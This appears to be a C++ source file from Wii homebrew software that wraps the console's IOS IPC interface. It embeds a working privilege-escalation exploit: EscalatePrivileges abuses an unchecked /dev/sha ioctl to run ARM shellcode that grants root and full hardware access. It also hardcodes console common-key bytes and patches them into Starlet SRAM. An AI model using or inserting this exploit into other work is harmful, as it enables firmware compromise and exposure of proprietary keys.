// Exploit based on https://github.com/TheLordScruffy/saoirse/blob/master/channel/Main/IOSBoot.cpp

#include "IOS.hh"

#include "Clock.hh"
#include "DCache.hh"

#include <cstring>

namespace IOS {

extern "C" volatile u32 ppcmsg;
extern "C" volatile u32 ppcctrl;
extern "C" volatile u32 armmsg;

extern "C" volatile u32 irqmask;

enum {
    X1 = 1 << 0,
    Y2 = 1 << 1,
    Y1 = 1 << 2,
    X2 = 1 << 3,
    IY1 = 1 << 4,
    IY2 = 1 << 5,
};

void Init() {
#ifdef SP_CHANNEL
    irqmask = 1 << 30;
    ppcctrl = X2;
#else
    // while ((ppcctrl & Y2) != Y2); HACK for Dolphin
    ppcctrl = Y2;
    ppcctrl = Y1;
#endif
}

enum class SC {
    IOS_SetUid = 0x2B,
    IOS_InvalidateDCache = 0x3F,
    IOS_FlushDCache = 0x40,
};

constexpr u32 syscall(SC id) {
    return 0xE6000010 | static_cast<u8>(id) << 5;
}

// clang-format off
#ifdef SP_LOADER
u32 armCode[] = {
    /* 0x00 */ 0xEA000000, // b       0x8
    /* 0x04 */ 0x00000000, // MESSAGE_VALUE
    /* 0x08 */ 0x00000000, // NEW_COMMON_KEY_ADDRESS
    // Set PPC UID to root
    /* 0x0C */ 0xE3A0000F, // mov     r0, #15
    /* 0x10 */ 0xE3A01000, // mov     r1, #0
    /* 0x14 */ syscall(SC::IOS_SetUid),
    // Enable full PPC access
    /* 0x18 */ 0xE3A05536, // mov     r5, #0xd800000
    /* 0x1C */ 0xE5954060, // ldr     r4, [r5, #0x60]
    /* 0x20 */ 0xE3841008, // orr     r1, r4, #8
    /* 0x24 */ 0xE5851060, // str     r1, [r5, #0x60]
    /* 0x28 */ 0xE5953064, // ldr     r3, [r5, #0x64]
    /* 0x2C */ 0xE3831EDF, // orr     r1, r3, #0xdf0
    /* 0x30 */ 0xE381113A, // orr     r1, r1, #0x8000000e
    /* 0x34 */ 0xE5851064, // str     r1, [r5, #0x64]
    // Send response to PPC
    /* 0x38 */ 0xE24F003C, // adr     r0, MESSAGE_VALUE
    /* 0x3C */ 0xE3A01001, // mov     r1, #1
    /* 0x40 */ 0xE5801000, // str     r1, [r0]
    // Flush the response to main memory
    /* 0x44 */ 0xE3A01004, // mov     r1, #8
    /* 0x48 */ syscall(SC::IOS_FlushDCache),
    // Wait for response back from PPC
    // loop_start:
    /* 0x4C */ 0xE24F0050, // adr     r0, MESSAGE_VALUE
    /* 0x50 */ 0xE5902000, // ldr     r2, [r0]
    /* 0x54 */ 0xE3520002, // cmp     r2, #2
    /* 0x58 */ 0x0A000001, // beq     loop_break
    /* 0x5C */ syscall(SC::IOS_InvalidateDCache),
    /* 0x60 */ 0xEAFFFFF9, // b       loop_start
    // loop_break:
    // Invalidate cache
    /* 0x64 */ 0xE5900004, // ldr     r0, [r0, #4]
    /* 0x68 */ 0xE3A01024, // mov     r1, #0x24
    /* 0x6C */ syscall(SC::IOS_InvalidateDCache),
    // Disable full PPC access
    /* 0x70 */ 0xE5853064, // str     r3, [r5, #0x64]
    /* 0x74 */ 0xE5854060, // str     r4, [r5, #0x60]
    // Reset PPC UID back to 15
    /* 0x78 */ 0xE3A0000F, // mov     r0, #15
    /* 0x7C */ 0xE3A0100F, // mov     r1, #15
    /* 0x80 */ syscall(SC::IOS_SetUid),
    // Send response to PPC
    /* 0x84 */ 0xE24F0088, // adr     r0, MESSAGE_VALUE
    /* 0x88 */ 0xE3A01003, // mov     r1, #3
    /* 0x8C */ 0xE5801000, // str     r1, [r0]
    // Flush the response to main memory
    /* 0x90 */ 0xE3A01004, // mov     r1, #4
    /* 0x94 */ syscall(SC::IOS_FlushDCache),
    /* 0x98 */ 0xE12FFF1E, // bx      lr
};
#else
u32 armCode[] = {
    /* 0x00 */ 0xEA000000, // b       0x8
    /* 0x04 */ 0x00000000, // MESSAGE_VALUE
    // Set PPC UID to root
    /* 0x08 */ 0xE3A0000F, // mov     r0, #15
    /* 0x0C */ 0xE3A01000, // mov     r1, #0
    /* 0x10 */ syscall(SC::IOS_SetUid),
    // Send response to PPC
    /* 0x14 */ 0xE24F0018, // adr     r0, MESSAGE_VALUE
    /* 0x18 */ 0xE3A01001, // mov     r1, #1
    /* 0x1C */ 0xE5801000, // str     r1, [r0]
    // Flush the response to main memory
    /* 0x20 */ 0xE3A01004, // mov     r1, #4
    /* 0x24 */ syscall(SC::IOS_FlushDCache),
    // Wait for response back from PPC
    // loop_start:
    /* 0x28 */ 0xE24F002C, // adr     r0, MESSAGE_VALUE
    /* 0x2C */ 0xE5902000, // ldr     r2, [r0]
    /* 0x30 */ 0xE3520002, // cmp     r2, #2
    /* 0x34 */ 0x0A000001, // beq     loop_break
    /* 0x38 */ syscall(SC::IOS_InvalidateDCache),
    /* 0x3C */ 0xEAFFFFF9, // b       loop_start
    // loop_break:
    // Reset PPC UID back to 15
    /* 0x40 */ 0xE3A0000F, // mov     r0, #15
    /* 0x44 */ 0xE3A0100F, // mov     r1, #15
    /* 0x48 */ syscall(SC::IOS_SetUid),
    // Send response to PPC
    /* 0x4C */ 0xE24F0050, // adr     r0, MESSAGE_VALUE
    /* 0x50 */ 0xE3A01003, // mov     r1, #3
    /* 0x54 */ 0xE5801000, // str     r1, [r0]
    // Flush the response to main memory
    /* 0x58 */ 0xE3A01004, // mov     r1, #4
    /* 0x5C */ syscall(SC::IOS_FlushDCache),
    /* 0x60 */ 0xE12FFF1E, // bx      lr
};
#endif
// clang-format on

bool IsDolphin() {
    // Modern versions
    Resource dolphin(ALIGNED_STRING("/dev/dolphin"), Mode::None);
    if (dolphin.ok()) {
        return true;
    }

    // Old versions
    Resource sha(ALIGNED_STRING("/dev/sha"), Mode::None);
    if (!sha.ok()) {
        return true;
    }

    return false;
}

static void SafeFlush(const void *start, size_t size) {
    // The IPC function flushes the cache here on PPC, and then IOS invalidates its own cache.
    // Note: IOS doesn't check for the invalid fd before doing what we want.
    File file(-1);
    file.write(start, size);
}

static u32 ReadMessage(u32 index) {
    u32 address = reinterpret_cast<u32>(&armCode[index]);
    u32 message;
    asm volatile("lwz %0, 0x0 (%1); sync" : "=r"(message) : "b"(0xC0000000 | address));
    return message;
}

static void WriteMessage(u32 index, u32 message) {
    u32 address = reinterpret_cast<u32>(&armCode[index]);
    asm volatile("stw %0, 0x0 (%1); eieio" : : "r"(message), "b"(0xC0000000 | address));
}

// Performs an IOS exploit and branches to the entrypoint in system mode.
//
// Exploit summary:
// - IOS does not check validation of vectors with length 0.
// - All memory regions mapped as readable are executable (ARMv5 has no 'no execute' flag).
// - NULL/0 points to the beginning of MEM1.
// - The /dev/sha resource manager, part of IOSC, runs in system mode.
// - It's obvious basically none of the code was audited at all.
//
// IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the length at all. Two of
// the 32-bit values it initializes are zero.
//
// Common approach: Point the context vector to the LR on the stack and then take control after
// return.
// A much more stable approach taken here: Overwrite the PC of the idle thread, which should always
// have its context start at 0xFFFE0000 in memory (across IOS versions).
bool EscalatePrivileges() {
    // Dolphin defaults to UID 0 for standalone binaries
    if (IsDolphin()) {
        return true;
    }

    // To make sure it's not in the PPC cache
    SafeFlush(armCode, sizeof(armCode));

    Resource sha(ALIGNED_STRING("/dev/sha"), Mode::None);
    if (!sha.ok()) {
        return false;
    }

    u32 *mem1 = reinterpret_cast<u32 *>(0x80000000);
    mem1[0] = 0x4903468D; // ldr r1, =0x10100000; mov sp, r1;
    mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
    // Overwrite reserved handler to loop infinitely
    mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    mem1[3] = 0x47080000; // bx r1
    mem1[4] = 0x10100000; // temporary stack
    mem1[5] = VirtualToPhysical(armCode);
    mem1[6] = 0xFFFF0014; // reserved handler

    alignas(0x20) Resource::IoctlvPair pairs[4];
    pairs[0].data = nullptr;
    pairs[0].size = 0;
    pairs[1].data = reinterpret_cast<void *>(0xFFFE0028);
    pairs[1].size = 0;
    // Unused vector utilized for cache safety
    pairs[2].data = reinterpret_cast<void *>(0x80000000);
    pairs[2].size = 0x20;

    // IOS_Ioctlv should never return an error if the exploit succeeded
    if (sha.ioctlv(0, 1, 2, pairs) < 0) {
        return false;
    }

    while (ReadMessage(1) != 1) {
        Clock::WaitMilliseconds(1);
    }
    return true;
}

void DeescalatePrivileges() {
    if (IsDolphin()) {
        return;
    }

    WriteMessage(1, 2);
    while (ReadMessage(1) != 3) {
        Clock::WaitMilliseconds(1);
    }
}

template <size_t N>
static bool Compare(const u32 (&mask)[N], const u32 (&pattern)[N], const u32 *ptr) {
    for (size_t i = 0; i < N; i++) {
        if ((ptr[i] & mask[i]) != pattern[i]) {
            return false;
        }
    }
    return true;
}

template <size_t N>
static const u32 *Find(const u32 (&mask)[N], const u32 (&pattern)[N], const u32 *start,
        const u32 *end) {
    for (const u32 *ptr = start; ptr <= end - N; ptr++) {
        if (Compare(mask, pattern, ptr)) {
            return ptr;
        }
    }
    return nullptr;
}

template <size_t N>
static void Copy(const u32 (&mask)[N], const u32 (&pattern)[N], u32 *ptr) {
    for (size_t i = 0; i < N; i++) {
        ptr[i] = (ptr[i] & ~mask[i]) | (pattern[i] & mask[i]);
    }
}

bool ImportNewCommonKey() {
    if (IsDolphin()) {
        return true;
    }

    // Find the common key in the Starlet SRAM.
    u32 keyMask[] = {0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
            0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF};
    u32 keyPattern[] = {0x01EBE42A, 0x225E8593, 0xE448D9C5, 0x457381AA, 0xF7000000, 0x00000000,
            0x00000000, 0x00000000, 0x00000000};
    const u32 *start = reinterpret_cast<u32 *>(0xCD410000);
    const u32 *end = reinterpret_cast<u32 *>(0xCD420000);
    start = Find(keyMask, keyPattern, start, end);
    if (!start) {
        return false;
    }

    // The new common key should be at a fixed offset.
    start += 27;
    // For Korean Wiis, it's already there.
    u32 newKeyMask[] = {0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
            0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF};
    u32 newKeyPattern[] = {0x0163B82B, 0xB4F4614E, 0x2E13F2FE, 0xFBBA4C9B, 0x7E000000, 0x00000000,
            0x00000000, 0x00000000, 0x00000000};
    if (Compare(newKeyMask, newKeyPattern, start)) {
        return true;
    }

    // For other Wiis, it's all zeros instead.
    u32 noKeyMask[] = {0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
            0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF};
    u32 noKeyPattern[] = {0x01000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
            0x00000000, 0x00000000, 0x00000000};
    if (!Compare(noKeyMask, noKeyPattern, start)) {
        return false;
    }

    // Copy it, and the address to invalidate the cache on the IOS side.
    Copy(newKeyMask, newKeyPattern, const_cast<u32 *>(start));
    WriteMessage(2, reinterpret_cast<u32>(start) & 0xffff0000);
    return true;
}

enum class Command : u32 {
    Open = 1,
    Close = 2,
    Read = 3,
    Write = 4,
    Seek = 5,
    Ioctl = 6,
    Ioctlv = 7,
};

struct Request {
    Command command;
    s32 result;
    s32 fd;
    union {
        struct {
            u32 path;
            Mode mode;
        } open;
        struct {
            u32 output;
            u32 outputSize;
        } read;
        struct {
            u32 input;
            u32 inputSize;
        } write;
        struct {
            u32 ioctl;
            u32 input;
            u32 inputSize;
            u32 output;
            u32 outputSize;
        } ioctl;
        struct {
            u32 ioctlv;
            u32 inputCount;
            u32 outputCount;
            u32 pairs;
        } ioctlv;
    };
    u8 user[0x40 - 0x20];
};
static_assert(sizeof(Request) == 0x40);

alignas(0x20) static Request request;

static void Sync() {
    DCache::Flush(request);

    ppcmsg = VirtualToPhysical(&request);
    ppcctrl = X1;

    while ((ppcctrl & Y2) != Y2) {
        if ((ppcctrl & Y1) == Y1) { // Expected an ack but got a reply!
            ppcctrl = Y1;
            ppcctrl = X2;
        }
    }
    ppcctrl = Y2;

    u32 reply;
    do {
        while ((ppcctrl & Y1) != Y1) {
            if ((ppcctrl & Y2) == Y2) { // Expected a reply but got an ack!
                ppcctrl = Y2;
            }
            Clock::WaitMilliseconds(1);
        }
        reply = armmsg;
        ppcctrl = Y1;

        ppcctrl = X2;
    } while (reply != VirtualToPhysical(&request));

    DCache::Invalidate(request);
}

Resource::Resource(s32 fd) : m_fd(fd) {}

Resource::Resource(const char *path, Mode mode) {
    open(path, mode);
}

Resource::~Resource() {
    if (m_fd >= 0) {
        close();
    }
}

s32 Resource::open(const char *path, Mode mode) {
    DCache::Flush(path, strlen(path) + 1);

    request = {};
    request.command = Command::Open;
    request.open.path = VirtualToPhysical(path);
    request.open.mode = mode;

    Sync();

    m_fd = request.result;
    return request.result;
}

s32 Resource::close() {
    request = {};
    request.command = Command::Close;
    request.fd = m_fd;

    Sync();

    m_fd = -1;
    return request.result;
}

s32 Resource::ioctl(u32 ioctl, const void *input, u32 inputSize, void *output, u32 outputSize) {
    DCache::Flush(input, inputSize);
    DCache::Flush(output, outputSize);

    request = {};
    request.command = Command::Ioctl;
    request.fd = m_fd;
    request.ioctl.ioctl = ioctl;
    request.ioctl.input = VirtualToPhysical(input);
    request.ioctl.inputSize = inputSize;
    request.ioctl.output = VirtualToPhysical(output);
    request.ioctl.outputSize = outputSize;

    Sync();

    DCache::Invalidate(output, outputSize);

    return request.result;
}

s32 Resource::ioctlv(u32 ioctlv, u32 inputCount, u32 outputCount, IoctlvPair *pairs) {
    for (u32 i = 0; i < inputCount + outputCount; i++) {
        if (pairs[i].data && pairs[i].size != 0) {
            DCache::Flush(pairs[i].data, pairs[i].size);
            pairs[i].data = reinterpret_cast<void *>(VirtualToPhysical(pairs[i].data));
        }
    }
    DCache::Flush(pairs, (inputCount + outputCount) * sizeof(IoctlvPair));

    request = {};
    request.command = Command::Ioctlv;
    request.fd = m_fd;
    request.ioctlv.ioctlv = ioctlv;
    request.ioctlv.inputCount = inputCount;
    request.ioctlv.outputCount = outputCount;
    request.ioctlv.pairs = VirtualToPhysical(pairs);

    Sync();

    for (u32 i = inputCount; i < inputCount + outputCount; i++) {
        if (pairs[i].data && pairs[i].size != 0) {
            pairs[i].data = PhysicalToVirtual<void *>(reinterpret_cast<u32>(pairs[i].data));
            DCache::Invalidate(pairs[i].data, pairs[i].size);
        }
    }

    return request.result;
}

bool Resource::ioctlvReboot(u32 ioctlv, u32 inputCount, IoctlvPair *pairs) {
    for (u32 i = 0; i < inputCount; i++) {
        if (pairs[i].data && pairs[i].size != 0) {
            DCache::Flush(pairs[i].data, pairs[i].size);
            pairs[i].data = reinterpret_cast<void *>(VirtualToPhysical(pairs[i].data));
        }
    }
    DCache::Flush(pairs, inputCount * sizeof(IoctlvPair));

    request = {};
    request.command = Command::Ioctlv;
    request.fd = m_fd;
    request.ioctlv.ioctlv = ioctlv;
    request.ioctlv.inputCount = inputCount;
    request.ioctlv.outputCount = 0;
    request.ioctlv.pairs = VirtualToPhysical(pairs);

    DCache::Flush(request);

    ppcmsg = VirtualToPhysical(&request);
    ppcctrl = X1;

    while ((ppcctrl & Y2) != Y2) {
        if ((ppcctrl & Y1) == Y1) {
            u32 reply = armmsg;
            ppcctrl = Y1;
            if (reply == VirtualToPhysical(&request)) {
                return false;
            }
        }
    }
    ppcctrl = Y2;

    while ((ppcctrl & Y2) != Y2) {
        if ((ppcctrl & Y1) == Y1) {
            u32 reply = armmsg;
            ppcctrl = Y1;
            if (reply == VirtualToPhysical(&request)) {
                return false;
            }
        }
    }
    ppcctrl = Y2;
    ppcctrl = X2;

    return true;
}

bool Resource::ok() const {
    return m_fd >= 0;
}

File::File(s32 fd) : Resource(fd) {}

File::File(const char *path, Mode mode) : Resource(path, mode) {}

File::~File() = default;

s32 File::read(void *output, u32 outputSize) {
    request = {};
    request.command = Command::Read;
    request.fd = m_fd;
    request.read.output = VirtualToPhysical(output);
    request.read.outputSize = outputSize;

    Sync();

    DCache::Invalidate(output, outputSize);
    return request.result;
}

s32 File::write(const void *input, u32 inputSize) {
    DCache::Flush(input, inputSize);

    request = {};
    request.command = Command::Write;
    request.fd = m_fd;
    request.write.input = VirtualToPhysical(input);
    request.write.inputSize = inputSize;

    Sync();

    return request.result;
}

} // namespace IOS
